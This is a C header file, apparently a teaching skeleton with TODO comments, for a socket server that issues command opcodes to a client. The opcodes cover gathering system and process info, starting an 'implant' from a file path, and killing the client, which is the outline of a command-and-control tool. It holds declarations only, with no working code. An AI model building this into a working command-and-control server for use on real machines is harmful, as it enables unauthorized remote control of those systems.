#pragma once

// TODO: Include all of your headers for your functions prototypes
#include <arpa/inet.h>

// COMMAND OPCODES
#define SERVER_OP_SUCCESS           0x001
#define SERVER_OP_FAIL              0x0FF
#define SERVER_OP_SYS_INFO          0x100
#define SERVER_OP_PROC_INFO         0x200
#define SERVER_OP_START_IMPLANT     0x300
#define SERVER_OP_CLIENT_KILL       0x400

#define MAX_TRANSMIT_SIZE 1024

// TODO: Declare your function prototypes
int create_socket();
int bind_socket(int clientfd, struct sockaddr *addr, socklen_t addrlen);
int listen_socket(int clientfd, int backlog);
int accept_socket(int clientfd, struct sockaddr *addr, socklen_t *addrlen);
int request_sys_info(int clientfd);
int request_proc_info(int clientfd);
int request_start_implant(int clientfd, char* filepath);
int request_client_kill(int clientfd);
int prompt_user();

